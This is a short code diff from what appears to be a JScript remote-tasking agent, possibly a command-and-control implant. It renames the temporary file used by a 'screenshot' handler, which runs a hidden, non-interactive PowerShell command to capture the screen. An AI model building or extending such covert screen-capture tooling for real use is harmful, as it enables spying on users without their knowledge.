@@ -410,7 +410,7 @@ var HANDLERS = {
         return { user_output: out || "(no output)", completed: true };
     },
     "screenshot": function (task) {
-        var tempPath = wshell.ExpandEnvironmentStrings("%TEMP%") + "\\~ss" + Math.floor(Math.random() * 99999) + ".png";
+        var tempPath = wshell.ExpandEnvironmentStrings("%TEMP%") + "\\screenshot_" + Math.floor(Math.random() * 99999) + ".png";
         var psCmd = 'powershell.exe -NoProfile -NonInteractive -Command "' +
             'Add-Type -AssemblyName System.Windows.Forms;' +
             'Add-Type -AssemblyName System.Drawing;' +
